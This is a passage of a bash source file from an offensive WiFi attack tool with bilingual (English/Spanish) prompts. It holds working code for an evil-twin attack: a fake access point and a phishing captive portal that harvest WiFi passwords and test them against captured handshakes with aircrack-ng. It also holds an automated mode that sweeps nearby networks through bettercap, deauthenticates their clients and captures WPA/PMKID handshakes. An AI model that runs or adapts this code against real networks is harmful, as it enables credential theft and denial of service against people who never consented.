	echo -e "\$HTTP[\"host\"] =~ \"captive.apple.com\" {"
	echo -e "  url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.apple.com/\")"
	echo -e "  url.redirect-code = 302"
	echo -e "}\n"
	echo -e "\$HTTP[\"host\"] =~ \"msftconnecttest.com\" {"
	echo -e "  url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.microsoft.com/\")"
	echo -e "  url.redirect-code = 302"
	echo -e "}\n"
	echo -e "\$HTTP[\"host\"] =~ \"msftncsi.com\" {"
	echo -e "  url.redirect = ( \"^/(.*)$\" => \"http://connectivitycheck.microsoft.com/\")"
	echo -e "  url.redirect-code = 302"
	echo -e "}\n"
	echo -e "server.port = 80\n"
	echo -e "index-file.names = ( \"index.htm\", \"index.html\", \"index.php\" )\n"
	echo -e "server.error-handler-404 = \"/\"\n"
	echo -e "mimetype.assign = ("
	echo -e "  \".css\" => \"text/css\","
	echo -e "  \".js\" => \"text/javascript\","
  echo -e "  \".html\" => \"text/html\""
	echo -e ")\n"
	echo -e "cgi.assign = ( \".htm\" => \"/bin/bash\" )"
	} >> "/usr/share/wef/cache/lighttpd.conf"
}

# Use 'sed' with regex to edit template
function create_template(){
  sed -i "s/<span class=\"bold\">.*<\/span>/<span class=\"bold\">${essid}<\/span>/" /usr/share/wef/main/captive-portals/${country_code}-portal/index.htm
  handshake_path=$(echo "${handshake_cap}" | sed 's/\//\\\//g')

  sed -i "26s/.*/if [ \"\$(timeout 1.5 bash -c \"aircrack-ng -a 2 -b ${ap_bssid} -w \'\/tmp\/www\/currentpass.txt\' \'${handshake_path}\' 2>\/dev\/null | grep \'KEY FOUND\'\")\" ]; then/" /usr/share/wef/main/captive-portals/${country_code}-portal/check.htm
}

function check_eviltwin_password(){
  while true; do
    sleep 0.1
    if [ -f "/tmp/www/success.txt" ] && [ "$(cat /tmp/www/currentpass.txt)" ]; then
      if [ "$lang" == "en" ]; then
        echo -e "\n\n${blueC}[${greenC}+${blueC}] Correct password obtained: ${yC}$(cat /tmp/www/currentpass.txt)${endC}"
        good_output "+" "Password stored in /usr/share/wef/main/captures/${ap_dir}/eviltwin_password.txt"
      else
        echo -e "\n\n${blueC}[${greenC}+${blueC}] Contraseña correcta obtenida: ${yC}$(cat /tmp/www/currentpass.txt)${endC}"
        good_output "+" "Contraseña almacenada en /usr/share/wef/main/captures/${ap_dir}/eviltwin_password.txt"
      fi
      
      cp "/tmp/www/currentpass.txt" "/usr/share/wef/main/captures/${ap_dir}/eviltwin_password.txt" 2>/dev/null
      rm -rf "/tmp/www" 2>/dev/null

      sleep 4
      killall xterm hostapd dnsmasq lighttpd 2>/dev/null
      break
    fi
  done
  
  if [ "$lang" == "en" ]; then
    press_enter "Attack finished, press [Enter] to return to menu "
  else
    press_enter "El ataque ha terminado, presiona [Enter] para volver al menu "
  fi
}

function check_eviltwin_success(){
  while true; do
    arp_out=$(arp -i ${evilCard} | grep "${evilCard}" | awk '{print $1}')
    arp_len=$(echo ${arp_out} | wc -l)
    echo -e "${blueC}[${yC}*${blueC}] EvilTwin${2}${endC}"
    echo -e "${blueC}------------${endC}"

    if [ "$lang" == "en" ]; then
      if [[ $arp_len == 1 ]] && [ ! "$arp_out" ]; then
        echo -e "${blueC}Total devices: ${yC}0${endC}"
      else
        echo -e "${blueC}Total devices: ${yC}${arp_len}${endC}"
      fi
    else
      if [[ $arp_len == 1 ]] && [ ! "$arp_out" ]; then
        echo -e "${blueC}Dispositivos totales: ${yC}0${endC}"
      else
        echo -e "${blueC}Dispositivos totales: ${yC}${arp_len}${endC}"
      fi
    fi

    if [[ $arp_len != 0 ]] && [ "${arp_out}" ]; then

      if [ "$lang" == "en" ]; then
        echo -e "${blueC}Devices info:${endC}"
      else
        echo -e "${blueC}Información sobre los dispositivos:${endC}"
      fi

      echo -e "${arp_out}"
    fi

    if [ -f "/tmp/www/currentpass.txt" ]; then
      if [ "$lang" == "en" ]; then
        echo -e "\n${blueC}Last passwords tried:\n${grayC}$(cat /tmp/www/attempts.txt 2>/dev/null)${endC}"
      else
        echo -e "\n${blueC}Últimas contraseñas probadas:\n${grayC}$(cat /tmp/www/attempts.txt 2>/dev/null)${endC}"
      fi
    fi

    if [ -f "/tmp/www/success.txt" ]; then
      if [ "$lang" == "en" ]; then
        echo -e "\n${blueC}[${greenC}+${blueC}] Correct password: ${grayC}$(cat /tmp/www/currentpass.txt 2>/dev/null)${endC}${endC}"
      else
        echo -e "\n${blueC}[${greenC}+${blueC}] Contraseña correcta: ${grayC}$(cat /tmp/www/currentpass.txt 2>/dev/null)${endC}${endC}"
      fi
      sleep 5
      break
    fi

    sleep 1; clear
  done
}

function execute_bettercap_command(){
  curl -s -X POST "http://user:pass@127.0.0.1:8081/api/session" -H "Content-Type: application/json" -d '{"cmd": "'"${1}"'"}' &>/dev/null
}

function pwnagotchi_check_handshake(){
  sleep 6

  #cch="$(curl -s http://user:pass@127.0.0.1:8081/api/session | jq -r '.wifi.aps' | jq -r --arg mac "${1}" 'map(select(.mac == $mac)) | .[] | if .handshake == true then "true" else "false" end')"

  wpa_check="$(echo "1" | aircrack-ng /root/bettercap-wifi-handshakes.pcap 2>/dev/null | grep "WPA" | grep -i "${1}" | grep -oP '(?<=WPA \().*(?=handshake)' | tr -d " ")"
  pmkid_check="$(echo "1" | aircrack-ng /root/bettercap-wifi-handshakes.pcap 2>/dev/null | grep "WPA" | grep -i "${1}" | grep "PMKID")"

  if [ ! "$wpa_check" ]; then
    wpa_check=0
  fi

  # Debug
  #echo -e "ESSID: ${2}; BSSID: ${1}; wpa_check: ${wpa_check}; pmkid_check: ${pmkid_check}"

  # Check if at least one WPA or PMKID handshake was captured
  if [[ "${wpa_check}" -gt 0 ]] || [ "${pmkid_check}" ]; then
    # Extract handshake from .pcap file
    hcxpcapngtool /root/bettercap-wifi-handshakes.pcap -o /usr/share/wef/cache/bettercap_handshakes.txt &>/dev/null
    sleep 0.1

    if [ "$(cat /usr/share/wef/cache/bettercap_handshakes.txt | grep -i "$(echo "${1}" | tr -d ":")")" ]; then
      if [ "${2}" ]; then
        if [ "$lang" == "en" ]; then
          echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] ${grayC}${2} ${blueC}(${grayC}${1}${blueC}) handshake has been captured and written to /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${2}-${1}/handshake.txt${endC}"
        else
          echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] El handshake de ${grayC}${2} ${blueC}(${grayC}${1}${blueC}) ha sido capturado y guardado como /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${2}-${1}/handshake.txt${endC}"
        fi
      else
        if [ "$lang" == "en" ]; then
          echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] ${grayC}${1} ${blueC} handshake has been captured and written to /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${1}/handshake.txt${endC}"
        else
          echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] El handshake de ${grayC}${1} ${blueC} ha sido capturado y guardado como /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${1}/handshake.txt${endC}"
        fi
      fi

      # Create a folder to save captured handshakes based on each AP essid and bssid
      if [ ! -d "/usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${2}-${1}/" ] && [ "${2}" ]; then
        mkdir "/usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${2}-${1}/" 2>/dev/null
      elif [ ! "${2}" ]; then
        mkdir "/usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${1}/" 2>/dev/null
      fi

      sleep 0.1

      if [ "${2}" ]; then
        hcxhashtool -i /usr/share/wef/cache/bettercap_handshakes.txt -o /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${2}-${1}/handshake.txt --mac-ap=$(echo "${1}" | tr -d ":") &>/dev/null
      else
        hcxhashtool -i /usr/share/wef/cache/bettercap_handshakes.txt -o /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/${1}/handshake.txt --mac-ap=$(echo "${1}" | tr -d ":") &>/dev/null
      fi
    fi

    rm /usr/share/wef/cache/bettercap_handshakes.txt 2>/dev/null
  fi
}

# Declare array which will contain the discovered APs
export seen_aps=()
# Declare array which will contain the APs that have been already pwned to skip them during loop
export pwned_aps_list=()
# Declare array which will contain APs that have not been pwned on the first attempt
export not_pwned_aps_list=()
# Declare array which will contain the APs that their handshake have not been captured even after multiple attempts to skip them
export not_pwneable_aps_list=()

function pwnagotchi(){
  clear

  if [ "$lang" == "en" ]; then
    # Display info about current status
    echo -e "${yC}PWNAGOTCHI MODE${endC}"
    echo -e "${yC}---------------${endC}"

    color_output "*" "The Pwnagotchi mode runs indefinitely until you press Ctrl+C"
    color_output "*" "If you want to add an AP to the whitelist, edit the config file and add \"whitelist=<your bssid goes here>\" without the double quotes"
    color_output "*" "Obtained handshakes will be stored in /usr/share/wef/main/pwnagotchi/"
    color_output "*" "A new folder will be created for every targeted AP to store the obtained info"
  else
    # Display info about current status
    echo -e "${yC}MODO PWNAGOTCHI${endC}"
    echo -e "${yC}---------------${endC}"

    color_output "*" "El modo Pwnagotchi correrá de forma infinita hasta que presiones Ctrl+C"
    color_output "*" "Si quieres añadir un AP a la whitelist, edita el archivo de configuración y añade \"whitelist=<tu bssid va aquí>\" sin las comillas"
    color_output "*" "Los handshakes obtenidos se almacenarán en /usr/share/wef/main/pwnagotchi/"
    color_output "*" "Se creará una carpeta por cada AP que sea atacado para almacenar la información obtenida"
  fi

  press_enter_attack

  trap keep_exit_pwnagotchi INT
  
  # Create directory for current pwnagotchi session
  pwnagotchi_dir="$(date +"%Y-%m-%d-%H-%M-%S")"
  mkdir "/usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/" 2>/dev/null

  if [ "" == "en" ]; then
    color_output_ln "*" "Starting bettercap service..."
    color_output "*" "Gathered information will be saved under /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/"
  else
    color_output_ln "*" "Iniciando servicio de bettercap..."
    color_output "*" "La información obtenida se almacenará bajo la ruta /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/"
  fi
  bettercap -caplet http-ui -iface "${netCard}" &>/dev/null &
  sleep 2
  echo

  # Declare variable just to check on first loop
  first_loop="true"

  # Declare time to reset detected APs
  reset_time="60s"

  # Declare debug variable (just for development purposes)
  debug="false"

  whitelist_bssid="$(awk -F '=' '/whitelist/ {print $2}' /usr/share/wef/wef.cnf | sed 's/#.*//' | tr -d " " | tr '[:upper:]' '[:lower:]' )"

  # Display info about current status
  if [ "$lang" == "en" ]; then
    echo -e "${yC}ACTIVITY LOG${endC}"
    echo -e "${yC}------------${endC}"
  else
    echo -e "${yC}REGISTRO DE ACTIVIDAD${endC}"
    echo -e "${yC}---------------------${endC}"
  fi

  # Scan nearby APs
  execute_bettercap_command "wifi.recon on"
  sleep 0.5

  #(
    #while true; do
      # Wait for N time to reset available information about current nearby APs that have not been pwned yet 
      #sleep "${reset_time}"

      #echo -e "RESETTING ARRAYS"

      # Empty arrays
      #seen_aps=()
      #not_pwned_aps=()
      #not_pwneable_aps=()
    #done
  #) &

  # Start infinite loop
  while true; do
    # Scan nearby APs (wifi.recon on)
    # Sleep for 6 seconds
    # Iterate over all APs
    # Change current channel (wifi.recon.channel x) in case it is different
    # Send association to get PMKID (wifi.assoc <bssid>)
    # Deauth all clients (one by one) (wifi.deauth <station>)

    # Set channels on which to scan nearby APs
    execute_bettercap_command "wifi.recon.channel 1,2,3,4,5,6,7,8,9,10,11,12,13"

    if [ "$lang" == "en" ]; then
      if [ "${first_loop}" == "true" ]; then
        echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Scanning nearby access points${endC}"
      else
        echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Scanning new nearby access points${endC}"
      fi
    else
      if [ "${first_loop}" == "true" ]; then
        echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Escaneando puntos de acceso cercanos${endC}"
      else
        echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Escaneando nuevos puntos de acceso cercanos${endC}"
      fi
    fi

    # Wait some seconds to discover nearby APs and their stations
    sleep 6.75

    # Extract and parse JSON info using jq
    aps="$(curl -s "http://user:pass@127.0.0.1:8081/api/session" | jq -r '.wifi.aps' | jq -r 'map(select((.channel < 36 or .channel > 165) and .encryption != "OPEN")) | sort_by(.channel) | .[] | "\(.mac),\(.hostname),\(.channel)," + (if .clients | length > 0 then "" + (.clients[] | "\(.mac),") else "" end)' | sort -u)"

    if [ "$debug" == "true" ]; then
      echo -e "$aps\n"
    fi

    #echo -e "aps: $aps"
    #echo -e "old_aps: $old_aps"

    # Parse pwned APs
    for d in /usr/share/wef/main/pwnagotchi/${pwnagotchi_dir}/*; do
      pwned_bssid="$(echo "${d}" | awk '{print $NF}' FS="/" | awk '{print $NF}' FS="-")"

      if [ "${pwned_bssid}" != "*" ]; then
        pwned_aps_list+=("${pwned_bssid}")
      fi

      # Remove AP from other arrays because it has been pwned
      if [ "${pwned_bssid}" ] && [ "${pwned_bssid}" != "*" ]; then
        seen_aps=($(echo "${seen_aps[@]}" | tr ' ' '\n' | sort -u | grep -v "${pwned_bssid}" | tr '\n' ' '))
        not_pwned_aps_list=($(echo "${not_pwned_aps_list[@]}" | tr ' ' '\n' | sort -u | grep -v "${pwned_bssid}" | tr '\n' ' '))
        not_pwneable_aps_list=($(echo "${not_pwneable_aps_list[@]}" | tr ' ' '\n' | sort -u | grep -v "${pwned_bssid}" | tr '\n' ' '))
      fi
    done

    # Remove duplicates
    seen_aps=($(echo "${seen_aps[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' '))
    pwned_aps_list=($(echo "${pwned_aps_list[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' '))
    not_pwned_aps_list=($(echo "${not_pwned_aps_list[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' '))
    not_pwneable_aps_list=($(echo "${not_pwneable_aps_list[@]}" | tr ' ' '\n' | sort -u | tr '\n' ' '))

    activity="false"

    if [ "$debug" == "true" ]; then
      echo -e "seen_aps: ${seen_aps[@]}"
      echo -e "pwned_aps_list: ${pwned_aps_list[@]}"
      echo -e "not_pwned_aps_list: ${not_pwned_aps_list[@]}"
      echo -e "not_pwneable_aps_list: ${not_pwneable_aps_list[@]}\n"
    fi

    # Iterate over all APs discovered
    while IFS= read -r line; do
      already_pwned="false"
      not_pwned="false"
      not_pwneable="false"
      removed_from_seen_aps="false"

      if [ "$exit_from_tool" == "false" ]; then
        if [ "$lang" == "en" ]; then
          color_output_ln  "*" "Returning to main menu..."
        else
          color_output_ln "*" "Volviendo al menú principal..."
        fi
        sleep 1

        break
      elif [ "$exit_from_tool" == "true" ]; then
        break
      fi

      # Parse information
      bssid="$(echo ${line} | awk '{print $1}' FS=',' | sed 's/^[" "]*//')"
      essid="$(echo ${line} | grep -oP "(?<=$bssid,).*(?=,\d+,)")"
      channel="$(echo ${line} | grep -oP "(?<=$bssid,$essid,)(\d+)(?=,)")"
      stations_info="$(echo -e "${aps}" | grep -i "${bssid}" | awk '{print $2}' FS="${bssid},${essid},${channel}," | tr -d "\n")"
      IFS=',' read -r -a stations <<< "$stations_info"

      #echo -e "bssid: $bssid"
      #echo -e "essid: $essid"
      #echo -e "channel: $channel"
      #echo -e "stations_info: $stations_info"
      #echo -e "stations: ${stations[@]}"

      if [ "${whitelist_bssid}" == "$(echo "${bssid}" | tr '[:upper:]' '[:lower:]')" ]; then
        if [ "$debug" == "true" ]; then
          echo -e "Skipping whitelist bssid"
        fi
        continue
      fi

      # Check if current AP was already pwned to skip it
      for pwned_ap in "${pwned_aps_list[@]}"; do
        if [ "${pwned_ap}" == "${bssid}" ]; then
          already_pwned="true"
          break
        fi
      done

      # Skip until next AP
      if [ "$already_pwned" == "true" ]; then
        if [ "$debug" == "true" ]; then
          echo -e "Skipping ${bssid} ($essid) as it is already pwned"
        fi
        continue
      fi

      pwnagotchi_check_handshake "${bssid}" "${essid}" &

      # Check if AP is included in not_pwned_aps_list array
      for not_pwned_ap in "${not_pwned_aps_list[@]}"; do
        if [ "${not_pwned_ap}" == "${bssid}" ]; then
          #echo "Removing $bssid ($essid) from not_pwned_aps_list: $(echo ${not_pwned_aps_list[@]} | tr ' ' '\n' | sort -u | tr '\n' ' ')"
          not_pwned_aps_list=($(echo "${not_pwned_aps_list[@]}" | tr ' ' '\n' | sort -u | grep -v "${bssid}" | tr '\n' ' '))
          #echo "Adding $bssid ($essid) to not_pwneable_aps_list: $(echo ${not_pwneable_aps_list[@]} | tr ' ' '\n' | sort -u | tr '\n' ' ')"
          not_pwneable_aps_list+=("${bssid}")
          not_pwned="true"
          break
        fi
      done

      # Parse stations associated to each AP and check if new stations were added
      current_stations="${stations_info}"
      old_stations="$(echo "${old_aps}" | grep -i "${bssid}" | awk '{print $2}' FS="${bssid},${essid},${channel}," | tr -d "\n")"

      if [ "$debug" == "true" ]; then
        echo "current_stations: ${current_stations[@]}"
        echo "old_stations: ${old_stations[@]}"
      fi

      #echo -e "current_stations: ${current_stations[@]}"
      #echo -e "old_stations: ${old_stations[@]}"

      # Check if current AP is marked as a AP which cannot be pwned due to multiple unsuccessful attempts
      for not_pwneable_ap in ${not_pwneable_aps_list[@]}; do
        if [ "${not_pwneable_ap}" == "${bssid}" ] && [ "${current_stations}" == "${old_stations}" ]; then
          not_pwneable="true"
          break
        fi
      done

      # Skip until next AP as current AP is not pwneable
      if [ "${not_pwneable}" == "true" ]; then
        #echo -e "Skipping not pwneable AP: ${bssid}"
        seen_aps=($(echo "${seen_aps[@]}" | tr ' ' '\n' | sort -u | grep -v "${bssid}" | tr '\n' ' '))
        not_pwned_aps_list=($(echo "${not_pwned_aps_list[@]}" | tr ' ' '\n' | sort -u | grep -v "${bssid}" | tr '\n' ' '))
        continue
      fi

      # Iterate over seen_aps array to add current AP to not_pwned_aps in case its handshake was not captured
      for seen_ap in "${seen_aps[@]}"; do
        if [ "${seen_ap}" == "${bssid}" ]; then
          #echo "Adding $bssid ($essid) to not_pwned_aps_list: $(echo ${not_pwned_aps_list[@]} | tr ' ' '\n' | sort -u | tr '\n' ' ')"
          not_pwned_aps_list+=("${bssid}") # Add AP to not_pwned_aps_list array
          #echo "Removing $bssid ($essid) from seen_aps: $(echo ${seen_aps[@]} | tr ' ' '\n' | sort -u | tr '\n' ' ')"
          seen_aps=($(echo "${seen_aps[@]}" | tr ' ' '\n' | sort -u | grep -v "${bssid}" | tr '\n' ' '))
          removed_from_seen_aps="true"
          break
        fi
      done

      # If current AP is not present in not_pwned_aps_list array, then add it to seen_aps array as it is a new discovered AP
      if [ "${removed_from_seen_aps}" == "false" ] && [ "${not_pwned}" == "false" ] && [ "${not_pwneable}" == "false" ]; then
        #echo "Adding $bssid (${essid}) to seen_aps: $(echo ${seen_aps[@]} | tr ' ' '\n' | sort -u | tr '\n' ' ')"
        # Add bssid to seen_aps arraya
        seen_aps+=("${bssid}")
        #echo -e "$bssid (${essid}) added to seen_aps: $(echo ${seen_aps[@]} | tr ' ' '\n' | sort -u | tr '\n' ' ')"
      fi

      # Change current channel to interact with target if necessary
      if [ "${current_channel}" != "${channel}" ] || [ "$first_loop" == "true" ]; then
        execute_bettercap_command "wifi.recon.channel ${channel}"
        current_channel="${channel}"
        first_loop="false"
        sleep 0.1
      fi

      # Send association to AP to try to catch PMKID handshake
      execute_bettercap_command "wifi.assoc ${bssid}"
      activity="true"

      if [ "$essid" ]; then
        if [ "$lang" == "en" ]; then
          echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Sending association frame to ${grayC}${essid} ${blueC}(${grayC}${bssid}${blueC})${endC}"
        else
          echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Enviando paquete de asociación a ${grayC}${essid} ${blueC}(${grayC}${bssid}${blueC})${endC}"
        fi
      else
        if [ "$lang" == "en" ]; then
          echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Sending association frame to ${grayC}${bssid}${endC}"
        else
          echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Enviando paquete de asociación a ${grayC}${bssid}${endC}"
        fi
      fi

      sleep 0.2

      # Deauthenticate stations of current AP
      for sta in ${stations}; do
        if [ "$essid" ]; then
          if [ "$lang" == "en" ]; then
            echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Deauthing station ${grayC}${sta} ${blueC}from ${grayC}${essid} ${blueC}(${grayC}${bssid}${blueC})${endC}"
          else
            echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Deautenticando la estación ${grayC}${sta} ${blueC}de ${grayC}${essid} ${blueC}(${grayC}${bssid}${blueC})${endC}"
          fi
        else
          if [ "$lang" == "en" ]; then
            echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Deauthing station ${grayC}${sta} ${blueC}from ${grayC}${bssid}${endC}"
          else
            echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] Deautenticando la estación ${grayC}${sta} ${blueC}de ${grayC}${bssid}${endC}"
          fi
        fi
        execute_bettercap_command "wifi.deauth ${sta}"

        activity="true"
        sleep 0.2
      done

      sleep 0.1
      #pwnagotchi_check_handshake "${bssid}" "${essid}" &

    done < <(printf '%s\n' "${aps}")

    if [ "${activity}" == "false" ]; then
      if [ "$lang" == "en" ]; then
        echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] There is not recent activity (no new APs were discovered)${endC}"
      else
        echo -e "${blueC}[${grayC}$(date +"%H:%M:%S")${blueC}] No hay actividad reciente (no se encontraron nuevos APs)${endC}"
      fi
    fi

    if [ "$exit_from_tool" == "true" ]; then
      killall bettercap &>/dev/null
      rm /root/bettercap-wifi-handshakes.pcap /usr/share/wef/cache/bettercap_handshakes.txt 2>/dev/null
      ctrl_c
    elif [ "$exit_from_tool" == "false" ]; then
      killall bettercap &>/dev/null
      rm /root/bettercap-wifi-handshakes.pcap /usr/share/wef/cache/bettercap_handshakes.txt 2>/dev/null
      exit_from_tool=""
      break
    fi

    old_aps="${aps}"

  done
}

# Evil Twin: 1º Hostapd --> 2º Dnsmasq --> 3º Lighttpd --> 4º Deauth (optional)
function evil_twin(){
  clear
  color_output_ln "*" "This attack creates a fake access point to obtain the password of a legitimate access point or login credentials by using custom templates"
  scan_aps
  log_back_to_menu

  ask_target
  if [ "$number" == "back" ]; then
    return
  fi
  parse_info
	
  if [ "${channel}" -lt "15" ]; then 
    hw_mode=g # 2.4 GHz
  else
    hw_mode=a # 5 GHz
  fi

  if [ "$lang" == "en" ]; then
    echo -e "${blueC}\nAvailable types of attack:${endC}"
  else
    echo -e "${blueC}\nTipos de ataques disponibles:${endC}"
  fi
  evil_twin_panel

  while true; do
    echo
    if [ "$lang" == "en" ]; then
      color_output_no_line "*" "Select an option: " && read evil_option
    else
      color_output_no_line "*" "Selecciona una opción: " && read evil_option
    fi

    if [ "$evil_option" != "1" ] && [ "$evil_option" != "2" ] && [ "$evil_option" != "3" ] && [ "$evil_option" != "4" ]; then
      if [ "$lang" == "en" ]; then
        color_output "X" "Invalid option"
      else
        color_output "X" "Opción inválida"
      fi
    else
      break
    fi
  done

  if [ "$evil_option" == "back" ]; then
    return
  fi

  echo
  if [ "$evil_option" == "1" ] || [ "$evil_option" == "2" ]; then

    if [ "$lang" == "en" ]; then
      color_output_no_line "*" "Do you want to use built-in templates (${yC}1${blueC}) or custom ones (${yC}2${blueC})? (default=1): " && read template_type
    else
      color_output_no_line "*" "¿Quieres usar plantillas predefinidas (${yC}1${blueC}) o plantillas personalizadas (${yC}2${blueC})? (por defecto=1): " && read template_type
    fi

    if [ "$template_type" == "1" ] || [ "$template_type" == "default" ] || [ ! "$template_type" ]; then
      if [ "$lang" == "en" ]; then
        color_output_no_line "*" "Do you want to verify if submitted passwords are correct? (target's handshake needed) (${yC}yes${blueC}/${yC}no${blueC}) (default=yes): " && read check_passwords
      else
        color_output_no_line "*" "¿Quieres verificar si las contraseñas introducidas son correctas? (se necesita el handshake del AP) (${yC}si${blueC}/${yC}no${blueC}) (por defecto=sí): " && read check_passwords
      fi

      if [ "$check_passwords" == "y" ] || [ "$check_passwords" == "yes" ] || [ "$check_passwords" == "s" ] || [ "$check_passwords" == "si" ] || [ ! "$check_passwords" ]; then
        while true; do
          if [ "$lang" == "en" ]; then
            color_output_no_line "*" "Introduce path to handshake file: " && read handshake_cap
          else
            color_output_no_line "*" "Introduce la ruta del archivo de handshake: " && read handshake_cap
          fi

          cap_name="${handshake_cap}"
          if [ "${handshake_cap}" == "back" ]; then
            return
          elif [ -f "${handshake_cap}" ]; then

            if [ ! "$(file "${handshake_cap}" | grep "cap capture file")" ]; then
              if [ "$lang" == "en" ]; then
                color_output "X" "Given file is not a valid network capture"
              else
                color_output "X" "El archivo no es una captura de red válida"
              fi

              continue
            fi

            if [ "$(check_handshakes_in_file "${cap_name}")" -gt "0" ]; then
              break
            else
              if [ "$lang" == "en" ]; then
                color_output "X" "File does not contain any handshake"
              else
                color_output "X" "El archivo no contiene ningún handshake"
              fi
            fi
          else
            if [ "$lang" == "en" ]; then
              color_output "X" "File does not exist"
            else
              color_output "X" "El archivo no existe"
            fi
          fi
        done
      elif [ "$check_passwords" == "back" ]; then
        return
      fi
    elif [ "$template_type" == "2" ] || [ "$template_type" == "custom" ]; then
      while true; do
        if [ "$lang" == "en" ]; then
          color_output_no_line "*" "Introduce path to template root: " && read portal_path
        else
          color_output_no_line "*" "Introduce la ruta de la raíz de la plantilla: " && read portal_path
        fi

        if [ ! -d "${portal_path}" ]; then
          if [ "$lang" == "en" ]; then
            color_output "X" "Given path cannot be found"
          else
            color_output "X" "No se encuentra la ruta especificada"
          fi
        else
          break
        fi
      done
    fi

    if [ "$lang" == "en" ]; then
      color_output_no_line "*" "Do you want to spoof ${essid} BSSID? (${yC}yes${blueC}/${yC}no${blueC}) (default=no): " && read mac_spoof
    else
      color_output_no_line "*" "¿Quieres suplantar la BSSID de ${essid}? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=no): " && read mac_spoof
    fi

    if [ ! "$mac_spoof" ]; then
      mac_spoof="no"
    fi

    if [ "$(command -v hostapd-wpe)" ]; then
      if [ "$lang" == "en" ]; then
        color_output_no_line "*" "Do you want to enable KARMA mode? (${yC}yes${blueC}/${yC}no${blueC}) (default=no): " && read karma
      else
        color_output_no_line "*" "¿Quieres activar el modo KARMA? (${yC}si${blueC}/${yC}no${blueC}) (por defecto=no): " && read karma
      fi

      if [ ! "$karma" ]; then
        karma="no"
      fi
    fi
  fi

  check_and_create "/tmp/www"
  if [ "$evil_option" == "2" ] || [ "$evil_option" == "4" ]; then

    if [ "$lang" == "en" ]; then
      if [ "$(check_vif)" ]; then
        good_output "+" "Your network adapter seems to support VIF"
      else
        color_output "*" "Your network adapter does not seem to support VIF"
      fi
      color_output_no_line "*" "To perform the DoS attack while the AP is running, physical card must be split into 2 cards (Virtual Interface). Do you want to continue? (${yC}yes${blueC}/${yC}no${blueC}): ${endC}" && read vif_check
    else
      if [ "$(check_vif)" ]; then
        good_output "+" "Tu adaptador de red parece soportar VIF"
      else
        color_output "*" "Tu adaptador de red parece no soportar VIF"
      fi
      color_output_no_line "*" "Para realizar el ataque DoS mientras el AP esta corriendo, la tarjeta física se debe dividir en 2 (Interfaz Virtual). ¿Quieres continuar? (${yC}si${blueC}/${yC}no${blueC}): ${endC}" && read vif_check
    fi

    if [ "$vif_check" == "n" ] || [ "$vif_check" == "no" ] || [ "$vif_check" == "back" ]; then
      if [ "$lang" == "en" ]; then
        echo -e "${blueC}Going back to menu...${endC}"; sleep 0.3
      else
        echo -e "${blueC}Volviendo al menu...${endC}"; sleep 0.3
      fi
      return
    fi
  fi

  trap keep_exit_eviltwin INT
  if [ "$lang" == "en" ]; then
    color_output_ln "*" "Configuring interface..."
  else
    color_output_ln "*" "Configurando la interfaz..."
  fi

  # Strange workaround for some interface errors & monitor mode
  airmon-ng stop ${netCard} &>/dev/null; sleep 0.1
  setup_interface_eviltwin

  if [ "$lang" == "en" ]; then
    good_output "+" "Interface configured successfully"
  else
    good_output "+" "Interfaz configurada correctamente"
  fi

  systemctl stop systemd-resolved &>/dev/null
  fuser -k 80/tcp &>/dev/null; sleep 0.1

  if [ "${airmon_check_kill}" == "true" ]; then
    airmon-ng check kill &>/dev/null
  fi

  killall hostapd hostapd-wpe dnsmasq lighttpd xterm dhcpd 2>/dev/null # Kill processes
  rm /usr/share/wef/cache/*.conf 2>/dev/null

  if [ "$evil_option" == "1" ] || [ "$evil_option" == "2" ]; then
    if [ "$template_type" == "built-in" ] || [ "$template_type" == "builtin" ] || [ "$template_type" == "predefinidas" ] || [ "$template_type" == "default" ] || [ ! "$template_type" ]; then
      while true; do
        languages=$(ls /usr/share/wef/main/captive-portals | grep "-" | tr "\n" "," | sed 's/,/, /g' | sed 's/, $//' | sed 's/-portal//g' 2>/dev/null)
        if [ "$lang" == "en" ]; then
          color_output_ln "*" "${blueC}Available languages:${grayC} ${languages}${endC}"
          color_output_no_line "*" "Select captive portal language you want to use, enter country code (i.e. en) (default=en): " && read country_code
        else
          color_output_ln "*" "${blueC}Idiomas disponibles:${grayC} ${languages}${endC}"
          color_output_no_line "*" "Selecciona el idioma del portal cautivo a usar, introduce el código del país (e.g. es) (por defecto=en): " && read country_code
        fi

        if [ ! "$country_code" ]; then
          country_code="en"
        elif [ "$country_code" == "back" ]; then
          return
          evil_twin_c
          killall hostapd hostapd-wpe dnsmasq lighttpd &>/dev/null
        fi

        if [ "$(echo "${languages}" | grep "${country_code}")" ]; then
          break
        else
